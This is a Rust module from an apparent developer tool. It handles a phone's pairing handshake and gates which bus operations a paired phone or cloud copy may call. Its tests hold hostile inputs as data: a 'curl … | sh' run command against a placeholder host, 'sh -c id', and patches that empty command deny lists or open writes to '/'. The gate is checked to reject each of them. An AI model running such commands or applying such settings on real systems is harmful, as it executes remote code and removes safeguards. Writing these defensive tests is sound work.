//! The handshake a phone performs before it may speak bus lines, and the one check every
//! line it sends afterwards goes through.
//!
//! The engine's socket door trusts anything with the same uid (BUS.md §0.6). The network is
//! not that, so this door adds one thing in front of it: a device that paired once, proving on
//! every connection that it still holds its token, without sending the token again.

use relay_bus::envelope::Response;
use relay_bus::error::BusError;
use relay_core::Instance;
use serde::{Deserialize, Serialize};

pub const WIRE_V: u32 = 1;

/// The first line the door sends, before the phone says anything. Anyone who reaches the door
/// reads it, and through a rendezvous that is anyone who knows the room id, so it carries only
/// what the handshake needs. Who the PC is (its name, id, Relay version and network cards) comes
/// in the `Welcome`, once the phone has proved itself.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct Greeting {
    pub v: u32,
    pub relay: String,
    /// Always empty now; still sent, because a door older than this read these three as
    /// required (an older PC's cloud link fails on a greeting without them).
    #[serde(default)]
    pub host: String,
    #[serde(default)]
    pub host_id: String,
    pub instance: String,
    #[serde(default)]
    pub version: String,
    /// Random per connection; the phone answers with `proof(challenge, token)`.
    pub challenge: String,
    /// `running`, or `stopped` when no engine answers and this door starts one for an admitted
    /// phone (`relay remote serve --start-engine`), so the phone can say the PC is waking Relay
    /// rather than leave the person looking at a silent link. Absent from older doors.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub engine: Option<String>,
}

/// The phone's answer: either a pairing code (first time) or a proof (every time after).
#[derive(Debug, Clone, Serialize, Deserialize, Default, PartialEq, Eq)]
pub struct Hello {
    pub v: u32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub pair: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub device_name: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub device: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub proof: Option<String>,
}

/// The door's verdict. `token` is present exactly once: in the reply to a pairing. An admitted
/// phone also learns here who it reached; a door older than this put that in the greeting.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
pub struct Welcome {
    pub v: u32,
    pub ok: bool,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub device: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub token: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
    /// This PC's name as phones see it (`relay remote name`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host_id: Option<String>,
    /// The Relay version the door runs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
    /// This PC's network cards, for Wake-on-LAN from a phone on the same network (`wake.rs`).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub wake: Vec<crate::wake::WakeTarget>,
    /// Which list the door gates with (`OpProfile::as_str`): `phone` on a PC, `cloud` on a cloud
    /// copy, so a device can refuse to take one for the other. Text, not the enum, so a list
    /// added later does not stop an older reader parsing the welcome; absent from older doors.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ops: Option<String>,
}

impl Welcome {
    pub fn paired(device: &str, token: &str) -> Welcome {
        Welcome { v: WIRE_V, ok: true, device: Some(device.into()), token: Some(token.into()), ..Default::default() }
    }
    pub fn admitted(device: &str) -> Welcome {
        Welcome { v: WIRE_V, ok: true, device: Some(device.into()), ..Default::default() }
    }
    pub fn denied(code: &str) -> Welcome {
        Welcome { v: WIRE_V, ok: false, error: Some(code.into()), ..Default::default() }
    }
    /// Who the phone reached, for a welcome that lets it in.
    pub fn with_host(self, host: &str, host_id: &str, version: &str, wake: Vec<crate::wake::WakeTarget>) -> Welcome {
        Welcome { host: Some(host.into()), host_id: Some(host_id.into()), version: Some(version.into()), wake, ..self }
    }
}

/// What a phone sends instead of its token: a digest that is only good for this connection.
/// Passive listening on the LAN learns the proof, not the credential. A pairing reply is the one
/// message that carries the token itself, which is why pairing windows are short and pairing
/// through the rendezvous should go over `wss://`. The proof binds nothing that follows: an
/// on-path attacker can inject into the admitted connection (docs/MOBILE.md §6).
pub fn proof(challenge: &str, token: &str) -> String {
    crate::registry::sha256_hex(&format!("{challenge}:{token}"))
}

/// Constant-time equality for two hex digests of the same length.
pub fn digest_eq(a: &str, b: &str) -> bool {
    if a.len() != b.len() {
        return false;
    }
    a.bytes().zip(b.bytes()).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

/// Whether a bus line from a paired phone may be forwarded to the engine.
pub enum Gate {
    /// Hand the line to the socket door as-is.
    Forward,
    /// Answer this ourselves; the engine never sees it.
    Reject(Box<Response>),
}

/// What a paired phone may call: the ops the apps send (apps/relay-android, and Tally's sync),
/// and nothing else.
/// The socket door gives `user` the whole bus, which is right for a person at this machine's
/// keyboard; a credential that lives on a phone, and can be lost with it, should not be able to
/// reconfigure what the engine executes (`settings.set`, which holds `providers.*.path` and
/// `device.adb_path`), quit the engine, or call ops no screen of the app uses. An op the app
/// starts sending is added here. Sorted: `gate` binary-searches it.
pub const PHONE_OPS: &[&str] = &[
    // Aide on the phone (docs/AIDE.md): what it said and what waits on you, its jobs to run or
    // pause, and its facts to confirm or forget. Its settings stay on the PC, so a lost phone
    // cannot point it at another server or open private data to Claude.
    "aide.chat", "aide.errand.list", "aide.errand.update", "aide.fact.forget", "aide.fact.list", "aide.fact.update",
    "aide.job.delete", "aide.job.get", "aide.job.list", "aide.job.set", "aide.message.list", "aide.run.now",
    "aide.run.stop", "aide.summary",
    "app.backup.list", "app.backup.now",
    // Arbiter on the phone: its reads, a proposal's answer, and the halt and restart keys.
    "arbiter.decision.list", "arbiter.halt", "arbiter.order.list", "arbiter.proposal.list",
    "arbiter.proposal.resolve", "arbiter.restart", "arbiter.series", "arbiter.settings.get",
    "arbiter.strategy.get", "arbiter.summary",
    "avd.boot", "avd.list",
    "bus.ping", "bus.subscribe", "bus.unsubscribe",
    "dashboard.get",
    // A project's design canvases, to list, open and draw with their pictures
    // (docs/DESIGN-CANVAS.md).
    "design.asset.get", "design.get", "design.list",
    "device.build", "device.list", "device.run", "device.run.list", "device.run.stop",
    "file.create", "file.delete", "file.move", "file.read", "file.rename", "file.restore",
    "file.restore_head", "file.search", "file.trash.list", "file.tree", "file.write",
    "git.branch.clean_merged", "git.branch.create", "git.branch.delete", "git.branch.switch",
    "git.branches", "git.commit", "git.diff", "git.diff.file", "git.fetch", "git.log", "git.pr.list",
    "git.pr.open", "git.push", "git.show", "git.stage", "git.status", "git.suggest_message",
    "git.unstage",
    "github.connect", "github.repo.list", "github.status",
    "guardrail.config.get", "guardrail.config.layers", "guardrail.config.set", "guardrail.confirm",
    "guardrail.hold.get", "guardrail.holds.list", "guardrail.reject", "guardrail.requests.list",
    // Avex's training history, read only.
    "gym.cardio", "gym.lift.get", "gym.lifts", "gym.series", "gym.session.get", "gym.sessions",
    "gym.summary",
    "integration.discard", "integration.get", "integration.list", "integration.request",
    "mailbox.list", "mailbox.send",
    "module.complete", "module.create", "module.delete", "module.list", "module.reopen",
    "module.restore", "module.update",
    // Tally's sync (antho976/Tally), and for the Threads space on the phone (apps/relay-android)
    // the ledger's reads, and the Undo of an entry a thread added or changed (and its Redo).
    "money.invest.delete", "money.invest.list", "money.invest.restore", "money.invest.summary",
    "money.lists", "money.series", "money.summary", "money.sync", "money.tx.delete",
    "money.tx.list", "money.tx.restore", "money.tx.update",
    "notes.append", "notes.create", "notes.delete", "notes.get", "notes.list", "notes.pin",
    "notes.restore", "notes.update",
    "notify.ack", "notify.ack_all", "notify.list", "notify.settings.get", "notify.settings.set",
    "overlap.list",
    "plugin.enable", "plugin.get", "plugin.list",
    "project.add", "project.clone", "project.list", "project.remove", "project.update",
    "provider.list", "provider.refresh", "provider.update",
    "session.attach", "session.brief", "session.clear_restorable", "session.close", "session.create",
    "session.detach", "session.discard_restorable", "session.get", "session.input", "session.list",
    "session.park", "session.resize", "session.restorable", "session.resume",
    "session.scrollback", "session.spawn", "session.transcript", "session.update", "session.upload",
    "session.wake",
    "settings.reset",
    // A skill is installed from a repository and switched per project from the phone, and no
    // skill text is typed on one. An install, or one that replaces a skill (`replace_skill_id`),
    // takes whatever text that repository holds, which every agent then loads.
    "skill.enable", "skill.get", "skill.install", "skill.list",
    "task.activity", "task.approve", "task.changelog.write",
    "task.comment", "task.create", "task.delete", "task.dispatch", "task.get",
    "task.label.add", "task.label.list", "task.label.remove", "task.link_commit", "task.list",
    "task.move", "task.parent.set", "task.relate", "task.restore", "task.unapprove", "task.unrelate",
    "task.update",
    // The Threads space on the phone: the same conversations as the PC's, and their pictures
    // (`thread.upload` writes one for a message to carry, `thread.image` reads one to draw); the
    // models on the PC; and the cards the agent asks on (`thread.proposal.*`).
    "thread.create", "thread.delete", "thread.get", "thread.image", "thread.list", "thread.models",
    "thread.pick", "thread.proposal.get", "thread.proposal.list", "thread.proposal.resolve",
    "thread.proposal.undo", "thread.rename", "thread.send", "thread.set", "thread.stop",
    "thread.upload",
    "usage.get",
    "workspace.create", "workspace.discover", "workspace.list", "workspace.update",
    "worktree.list",
];

/// What a device paired with a *cloud* engine may call (`relay serve --remote --remote-ops cloud`,
/// docs/CLOUD.md): an always-on copy of the ledger and the training history on a server, which
/// Tally and Avex sync with while the PC is off, and which the PC's cloud link merges into its own.
/// It holds no projects, terminals or agents, and a credential that reaches it over the internet
/// is offered nothing but that data. Sorted: `gate_for` binary-searches it.
pub const CLOUD_OPS: &[&str] = &[
    "bus.ping", "bus.subscribe", "bus.unsubscribe",
    "gym.cardio", "gym.lift.get", "gym.lifts", "gym.raw", "gym.series", "gym.session.get",
    "gym.sessions", "gym.summary", "gym.upload",
    "money.invest.list", "money.invest.summary", "money.lists", "money.series", "money.summary",
    "money.sync", "money.tx.list",
];

/// Which list a door gates with.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum OpProfile {
    /// The PC's own door: `PHONE_OPS`.
    #[default]
    Phone,
    /// A cloud engine's door: `CLOUD_OPS`.
    Cloud,
}

impl OpProfile {
    pub fn ops(self) -> &'static [&'static str] {
        match self {
            OpProfile::Phone => PHONE_OPS,
            OpProfile::Cloud => CLOUD_OPS,
        }
    }

    pub fn parse(s: &str) -> Option<OpProfile> {
        match s {
            "phone" => Some(OpProfile::Phone),
            "cloud" => Some(OpProfile::Cloud),
            _ => None,
        }
    }

    /// What `parse` reads, and what an admitted device is told in its welcome.
    pub fn as_str(self) -> &'static str {
        match self {
            OpProfile::Phone => "phone",
            OpProfile::Cloud => "cloud",
        }
    }
}

/// Whether a request would create a session on the API key: `session.create` itself, or the
/// template `task.dispatch` creates one session per task from. Anything there but `false` or
/// null counts, so no spelling the engine would read as true gets past.
fn asks_for_api_key(value: &serde_json::Value, op: &str) -> bool {
    let at = match op {
        "session.create" => "/payload/use_api_key",
        "task.dispatch" => "/payload/create/use_api_key",
        _ => return false,
    };
    value.pointer(at).is_some_and(|v| !matches!(v, serde_json::Value::Bool(false) | serde_json::Value::Null))
}

/// What a request would change about the commands the engine runs on its own, outside any
/// agent's guardrail: a project's build and run commands (an integration build and Run on device
/// hand them to the shell as they are), and the guardrail keys that decide what agents may
/// execute and where they may write. `None` for anything else. A `null` build or run command
/// goes back to Relay's default and is allowed; caps, protected paths and the destructive-write
/// thresholds stay the phone's to tune.
fn changes_what_runs(value: &serde_json::Value, op: &str) -> Option<&'static str> {
    const GUARDS: &str = "the commands agents may run and the folders they may write";
    let payload = &value["payload"];
    match op {
        "project.update" => ["build_cmd", "run_cmd"].iter().any(|key| payload.get(key).is_some_and(|v| !v.is_null()))
            .then_some("a project's build and run commands"),
        // Any mention, `null` included: clearing a project's own list brings back a looser one.
        "guardrail.config.set" => PC_GUARDS.iter().any(|key| payload["patch"].get(key).is_some()).then_some(GUARDS),
        // A reset deletes everything under its path, so one at or above those keys clears them
        // too: the whole tree (`""`), `guardrails`, a layer, or every layer of a kind.
        "settings.reset" => resets_pc_guards(payload["path"].as_str().unwrap_or("")).then_some(GUARDS),
        _ => None,
    }
}

/// The guardrail keys that decide what agents may execute and where they may write: set from
/// the PC alone.
const PC_GUARDS: [&str; 5] = ["denied_commands", "allowed_write_roots", "roles", "shape_gates", "agent_builds"];

/// Whether `settings.reset` at `path` would clear a [`PC_GUARDS`] key of some guardrail layer.
/// The global layer is `guardrails.<key>`; a workspace's and a project's are
/// `guardrails.workspaces.<id>.<key>` and `guardrails.projects.<id>.<key>`.
fn resets_pc_guards(path: &str) -> bool {
    let segments: Vec<&str> = path.trim().split('.').collect();
    match segments.as_slice() {
        [""] | ["guardrails"] => true,
        ["guardrails", "workspaces" | "projects", rest @ ..] => match rest {
            [] | [_] => true,
            [_, key, ..] => PC_GUARDS.contains(key),
        },
        ["guardrails", key, ..] => PC_GUARDS.contains(key),
        _ => false,
    }
}

/// `gate_for` with the phone's list: the PC's own door.
pub fn gate(line: &str, instance: Instance) -> Gate {
    gate_for(line, instance, OpProfile::Phone)
}

/// A phone is the user at the keyboard, and only that: `agent:*` and `system` are refused here
/// before they can reach the socket door with a guessed token, `test` is accepted only on an
/// instance that accepts it (BUS.md §4.1), and only `PHONE_OPS` pass. `line` is one line: the
/// engine reads its door line by line, so a frame holding several is gated piece by piece
/// (`bridge.rs`). A line that is not JSON is forwarded untouched so the engine produces its own
/// typed `bus.parse` refusal; it cannot act on what it cannot parse. `profile` says which list.
pub fn gate_for(line: &str, instance: Instance, profile: OpProfile) -> Gate {
    let Ok(value) = serde_json::from_str::<serde_json::Value>(line) else {
        return Gate::Forward;
    };
    let actor = value.get("actor").and_then(|a| a.as_str()).unwrap_or("");
    let op = value.get("op").and_then(|o| o.as_str()).unwrap_or("");
    let error = if !(actor == "user" || (actor == "test" && instance.accepts_test_actor())) {
        BusError::invalid(
            "bus.actor",
            format!("a remote device acts as `user`; actor {actor:?} is not accepted on this door"),
        )
    } else if profile.ops().binary_search(&op).is_err() {
        BusError::refused("remote.op", match profile {
            OpProfile::Phone => format!("{op} is not open to a paired phone; run it on the PC"),
            OpProfile::Cloud => format!("{op} is not open on a cloud copy, which holds only the ledger and the training history"),
        })
    } else if profile == OpProfile::Phone && op == "device.build" && value.pointer("/payload/publish") == Some(&serde_json::Value::Bool(true)) {
        // An upload to Google Play cannot be taken back, and a phone token can be lost with the
        // phone: a phone builds a release, the desktop publishes it.
        BusError::refused("remote.publish", "publishing to Google Play is only from the desktop; a phone can build a release, not publish it")
            .with_hint("build it with publish off, then publish it from Relay on the PC")
    } else if let Some(what) = (profile == OpProfile::Phone).then(|| changes_what_runs(&value, op)).flatten() {
        // A phone credential can be lost with the phone, and these are run with no agent and no
        // guardrail between them and the PC's shell: `project.update {run_cmd}` and then
        // `device.run` executed whatever a phone sent.
        BusError::refused("remote.command", format!("{what} are changed only from Relay on the PC"))
            .with_hint("change them in the project's settings on the PC")
    } else if profile == OpProfile::Phone && asks_for_api_key(&value, op) {
        // Billed to the user's own key: whoever holds or forges a phone's link could start as
        // many as they liked. The choice is made at the PC.
        BusError::refused("remote.api_key", "a session on your API key is started only from Relay on the PC")
            .with_hint("start it without the API key, or from the desktop")
    } else {
        return Gate::Forward;
    };
    let id = value
        .get("id")
        .and_then(|i| i.as_str())
        .and_then(|i| i.parse().ok());
    Gate::Reject(Box::new(match id {
        Some(id) => Response::err(id, error),
        None => Response::unparsed(error),
    }))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn proof_depends_on_both_halves_and_compares_in_constant_time() {
        let a = proof("c1", "t1");
        assert_eq!(a, proof("c1", "t1"));
        assert_ne!(a, proof("c2", "t1"));
        assert_ne!(a, proof("c1", "t2"));
        assert!(digest_eq(&a, &a));
        assert!(!digest_eq(&a, &proof("c2", "t1")));
        assert!(!digest_eq(&a, &a[..10]));
    }

    #[test]
    fn only_the_user_passes_the_gate() {
        let user = r#"{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0001","actor":"user","op":"bus.ping","payload":{}}"#;
        assert!(matches!(gate(user, Instance::Stable), Gate::Forward));
        let agent = r#"{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0002","actor":"agent:brisk-otter","op":"bus.ping","payload":{},"token":"x"}"#;
        match gate(agent, Instance::Stable) {
            Gate::Reject(resp) => {
                assert!(!resp.ok);
                assert_eq!(resp.id.map(|i| i.to_string()).as_deref(), Some("7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0002"));
                assert_eq!(resp.error.unwrap().code, "bus.actor");
            }
            Gate::Forward => panic!("agent forwarded"),
        }
        let test = r#"{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0003","actor":"test","op":"bus.ping","payload":{}}"#;
        assert!(matches!(gate(test, Instance::Dev), Gate::Forward));
        assert!(matches!(gate(test, Instance::Stable), Gate::Reject(_)));
        // The engine's own parser owns the verdict on garbage.
        assert!(matches!(gate("not json", Instance::Stable), Gate::Forward));
        assert!(matches!(gate(r#"{"v":1}"#, Instance::Stable), Gate::Reject(r) if r.id.is_none()));
    }

    #[test]
    fn a_phone_calls_only_the_ops_the_app_uses() {
        let line = |op: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0004","actor":"user","op":"{op}","payload":{{}}}}"#);
        assert!(matches!(gate(&line("session.input"), Instance::Stable), Gate::Forward));
        // A thread's pictures: the one write that sends a picture, and the read that draws it.
        for op in ["thread.upload", "thread.image", "thread.send"] {
            assert!(matches!(gate(&line(op), Instance::Stable), Gate::Forward), "{op}");
        }
        let kind = |op: &str| relay_bus::registry::Registry::global().get(op).unwrap().meta.kind;
        assert_eq!(kind("thread.upload"), relay_bus::registry::OpKind::Mutation);
        assert_eq!(kind("thread.image"), relay_bus::registry::OpKind::Query);
        // A design's pictures, read in pieces to draw on its canvas.
        assert!(matches!(gate(&line("design.asset.get"), Instance::Stable), Gate::Forward));
        assert_eq!(kind("design.asset.get"), relay_bus::registry::OpKind::Query);
        // A thread's agent proposes from the PC alone.
        assert!(matches!(gate(&line("thread.propose"), Instance::Stable), Gate::Reject(_)));
        // Aide's "Not now" removes the job it proposed.
        assert!(matches!(gate(&line("aide.job.delete"), Instance::Stable), Gate::Forward));
        // Audit rows carry stored payloads (held actions, prompts, an old Arbiter key), and no
        // screen of the app reads them. A skill's text is loaded by every agent: the phone
        // installs and switches skills, and writes none.
        for op in ["settings.set", "app.quit", "guardrail.grant.revoke", "worktree.remove", "os.open_url", "no.such", "audit.list", "audit.undo",
            "skill.create", "skill.update", "skill.delete", "workspace.remove", "task.attach", "ui.page.switch"] {
            match gate(&line(op), Instance::Stable) {
                Gate::Reject(resp) => assert_eq!(resp.error.unwrap().code, "remote.op"),
                Gate::Forward => panic!("{op} forwarded"),
            }
        }
        // `binary_search` needs the order, and a renamed op must not linger here unnoticed.
        assert!(PHONE_OPS.windows(2).all(|w| w[0] < w[1]), "PHONE_OPS is not sorted");
        let registry = relay_bus::registry::Registry::global();
        for op in PHONE_OPS {
            assert!(registry.get(op).is_some(), "{op} is not a bus op");
        }
    }

    #[test]
    fn a_phone_builds_a_release_but_never_publishes_one() {
        let line = |payload: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0006","actor":"user","op":"device.build","payload":{payload}}}"#);
        for payload in [r#"{"project_id":1}"#, r#"{"project_id":1,"publish":false}"#, r#"{"project_id":1,"publish":null}"#] {
            assert!(matches!(gate(&line(payload), Instance::Stable), Gate::Forward), "{payload}");
        }
        match gate(&line(r#"{"project_id":1,"publish":true,"format":"bundle"}"#), Instance::Stable) {
            Gate::Reject(resp) => {
                let error = resp.error.unwrap();
                assert_eq!(error.code, "remote.publish");
                assert!(error.message.contains("only from the desktop"), "{}", error.message);
            }
            Gate::Forward => panic!("a phone's publish was forwarded"),
        }
    }

    #[test]
    fn a_phone_starts_no_session_on_the_api_key() {
        let line = |op: &str, payload: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0007","actor":"user","op":"{op}","payload":{payload}}}"#);
        for (op, payload) in [
            ("session.create", r#"{"project_id":1,"provider":"claude"}"#),
            ("session.create", r#"{"project_id":1,"provider":"claude","use_api_key":false}"#),
            ("session.create", r#"{"project_id":1,"provider":"claude","use_api_key":null}"#),
            ("task.dispatch", r#"{"task_id":1,"create":{"project_id":1,"provider":"claude"}}"#),
        ] {
            assert!(matches!(gate(&line(op, payload), Instance::Stable), Gate::Forward), "{op} {payload}");
        }
        for (op, payload) in [
            ("session.create", r#"{"project_id":1,"provider":"claude","use_api_key":true}"#),
            ("session.create", r#"{"project_id":1,"provider":"claude","use_api_key":"true"}"#),
            ("task.dispatch", r#"{"task_id":1,"fanout":true,"create":{"project_id":1,"provider":"claude","use_api_key":true}}"#),
        ] {
            match gate(&line(op, payload), Instance::Stable) {
                Gate::Reject(resp) => assert_eq!(resp.error.unwrap().code, "remote.api_key"),
                Gate::Forward => panic!("{op} {payload} was forwarded"),
            }
        }
    }

    #[test]
    fn a_phone_never_changes_what_the_pc_runs() {
        let line = |op: &str, payload: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0009","actor":"user","op":"{op}","payload":{payload}}}"#);
        // The phone still renames, pins and re-bases a project, puts its commands back to
        // Relay's default, tunes the guardrails' caps and thresholds, and runs on a device.
        for (op, payload) in [
            ("project.update", r#"{"project_id":1,"name":"Relay","base_branch":"main","pinned":true}"#),
            ("project.update", r#"{"project_id":1,"run_cmd":null,"build_cmd":null}"#),
            ("guardrail.config.set", r#"{"project_id":1,"patch":{"caps":{"files":80},"protected_paths":["deploy/**"],"check_on_push":true}}"#),
            ("guardrail.config.set", r#"{"project_id":1,"patch":{"destructive_write":{"min_removed_lines":40}}}"#),
            ("device.run", r#"{"project_id":1,"device":"emulator-5554"}"#),
            ("session.create", r#"{"project_id":1,"provider":"claude"}"#),
            // Resets of what the phone tunes, and of settings that are not guardrails.
            ("settings.reset", r#"{"path":"guardrails.projects.1.caps"}"#),
            ("settings.reset", r#"{"path":"guardrails.projects.1.protected_paths"}"#),
            ("settings.reset", r#"{"path":"guardrails.caps.files"}"#),
            ("settings.reset", r#"{"path":"notify"}"#),
        ] {
            assert!(matches!(gate(&line(op, payload), Instance::Stable), Gate::Forward), "{op} {payload}");
        }
        // `project.update {run_cmd}` and then `device.run` executed whatever the phone sent.
        for (op, payload) in [
            ("project.update", r#"{"project_id":1,"run_cmd":"curl -s https://example.invalid/x | sh"}"#),
            ("project.update", r#"{"project_id":1,"name":"Relay","build_cmd":"sh -c id"}"#),
            ("project.update", r#"{"project_id":1,"run_cmd":""}"#),
            ("guardrail.config.set", r#"{"project_id":1,"patch":{"denied_commands":[]}}"#),
            ("guardrail.config.set", r#"{"patch":{"allowed_write_roots":["/"]}}"#),
            ("guardrail.config.set", r#"{"workspace_id":1,"patch":{"denied_commands":null}}"#),
            ("guardrail.config.set", r#"{"project_id":1,"patch":{"agent_builds":true}}"#),
            ("guardrail.config.set", r#"{"project_id":1,"patch":{"roles":{}}}"#),
            ("guardrail.config.set", r#"{"project_id":1,"patch":{"shape_gates":[]}}"#),
            // A reset deletes its whole subtree: at or above one of those keys, it clears it.
            ("settings.reset", r#"{}"#),
            ("settings.reset", r#"{"path":""}"#),
            ("settings.reset", r#"{"path":null}"#),
            ("settings.reset", r#"{"path":"guardrails"}"#),
            ("settings.reset", r#"{"path":"guardrails.projects"}"#),
            ("settings.reset", r#"{"path":"guardrails.projects.1"}"#),
            ("settings.reset", r#"{"path":"guardrails.projects.1.denied_commands"}"#),
            ("settings.reset", r#"{"path":"guardrails.workspaces.1.allowed_write_roots"}"#),
            ("settings.reset", r#"{"path":"guardrails.workspaces"}"#),
            ("settings.reset", r#"{"path":"guardrails.denied_commands"}"#),
            ("settings.reset", r#"{"path":"guardrails.roles.builder"}"#),
        ] {
            match gate(&line(op, payload), Instance::Stable) {
                Gate::Reject(resp) => {
                    let error = resp.error.unwrap();
                    assert_eq!(error.code, "remote.command", "{op} {payload}");
                    assert!(error.message.contains("only from Relay on the PC"), "{}", error.message);
                }
                Gate::Forward => panic!("{op} {payload} was forwarded"),
            }
        }
    }

    /// Every op a screen of the app sends must be open at the door, or the door refuses it with
    /// `remote.op` and the button does nothing: that is how Aide's "Not now" shipped broken. The
    /// app's sources are read here, so this runs with the engine's tests on a change to either
    /// side. The app sends ops through many helpers, an op name in any argument, a constant or a
    /// list, so every op name the app's code spells counts, except the few it names only as a
    /// label (what a thread's agent did, a hold's kind): those are listed here, and a send of one
    /// of them is the one case this cannot see.
    #[test]
    fn every_op_the_app_sends_is_open_to_a_phone() {
        const LABELS_ONLY: &[&str] = &[
            "aide.job.propose", "aide.notify", "aide.run.finish", "arbiter.backtest", "arbiter.order.place",
            "arbiter.products", "arbiter.propose", "bus.schema", "guardrail.gate", "guardrail.request",
            "money.account.add", "money.account.update", "money.budget.set", "money.invest.add", "money.tx.add",
            "thread.propose",
        ];
        let app = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../../apps/relay-android");
        let registry = relay_bus::registry::Registry::global();
        let mut files = vec![app];
        let mut sent = std::collections::BTreeMap::<String, String>::new();
        let mut labels = std::collections::BTreeSet::<String>::new();
        while let Some(path) = files.pop() {
            if path.is_dir() {
                if !matches!(path.file_name().and_then(|n| n.to_str()), Some("build" | "test" | "androidTest" | ".gradle")) {
                    files.extend(std::fs::read_dir(&path).unwrap().map(|entry| entry.unwrap().path()));
                }
                continue;
            }
            if path.extension().and_then(|e| e.to_str()) != Some("kt") {
                continue;
            }
            let text = std::fs::read_to_string(&path).unwrap();
            for (at, _) in text.match_indices('"') {
                let Some(name) = text[at + 1..].split('"').next() else { continue };
                if registry.get(name).is_none() {
                    continue;
                }
                if LABELS_ONLY.contains(&name) {
                    labels.insert(name.to_string());
                } else {
                    sent.entry(name.to_string()).or_insert_with(|| path.display().to_string());
                }
            }
        }
        assert!(sent.len() > 150, "found only {} ops: has the app moved?", sent.len());
        let closed: Vec<_> = sent.iter().filter(|(op, _)| PHONE_OPS.binary_search(&op.as_str()).is_err()).collect();
        assert!(closed.is_empty(), "the app sends ops the phone door refuses (or names a new label: list it above): {closed:?}");
        // A label the app no longer names leaves the list, so it cannot hide a later send.
        let unused: Vec<_> = LABELS_ONLY.iter().filter(|op| !labels.contains(**op)).collect();
        assert!(unused.is_empty(), "no longer named by the app: {unused:?}");
        for op in LABELS_ONLY {
            assert!(PHONE_OPS.binary_search(op).is_err(), "{op} is open to a phone, so it is not only a label");
        }
    }

    #[test]
    fn a_cloud_door_opens_only_the_data() {
        let line = |op: &str| format!(r#"{{"v":1,"id":"7f2b5d2e-2f1a-4b7c-9a6c-1c9d1e6a0005","actor":"user","op":"{op}","payload":{{}}}}"#);
        for op in ["money.sync", "gym.upload", "gym.raw", "gym.summary", "bus.ping"] {
            assert!(matches!(gate_for(&line(op), Instance::Stable, OpProfile::Cloud), Gate::Forward), "{op}");
        }
        for op in ["session.spawn", "session.input", "file.write", "git.push", "thread.send", "money.reset", "gym.import"] {
            match gate_for(&line(op), Instance::Stable, OpProfile::Cloud) {
                Gate::Reject(resp) => assert_eq!(resp.error.unwrap().code, "remote.op"),
                Gate::Forward => panic!("{op} forwarded on a cloud door"),
            }
        }
        // The PC's own door does not take an upload: the cloud link imports it there itself.
        assert!(matches!(gate(&line("gym.upload"), Instance::Stable), Gate::Reject(_)));
        assert!(CLOUD_OPS.windows(2).all(|w| w[0] < w[1]), "CLOUD_OPS is not sorted");
        let registry = relay_bus::registry::Registry::global();
        for op in CLOUD_OPS {
            assert!(registry.get(op).is_some(), "{op} is not a bus op");
        }
    }

    #[test]
    fn a_welcome_reads_with_or_without_the_door_it_came_from() {
        let older: Welcome = serde_json::from_str(r#"{"v":1,"ok":true,"device":"d1"}"#).unwrap();
        assert_eq!(older.ops, None);
        let newer: Welcome = serde_json::from_str(r#"{"v":1,"ok":true,"device":"d1","ops":"cloud","later":1}"#).unwrap();
        assert_eq!(newer.ops.as_deref().and_then(OpProfile::parse), Some(OpProfile::Cloud));
        // Nothing is added to a welcome that does not say it.
        assert!(!serde_json::to_string(&Welcome::admitted("d1")).unwrap().contains("ops"));
        for profile in [OpProfile::Phone, OpProfile::Cloud] {
            assert_eq!(OpProfile::parse(profile.as_str()), Some(profile));
        }
    }

    #[test]
    fn hello_accepts_either_shape() {
        let pair: Hello = serde_json::from_str(r#"{"v":1,"pair":"ABCD-EFGH","device_name":"Pixel"}"#).unwrap();
        assert_eq!(pair.pair.as_deref(), Some("ABCD-EFGH"));
        let proof: Hello = serde_json::from_str(r#"{"v":1,"device":"abc","proof":"00"}"#).unwrap();
        assert_eq!(proof.device.as_deref(), Some("abc"));
        assert!(proof.pair.is_none());
    }
}
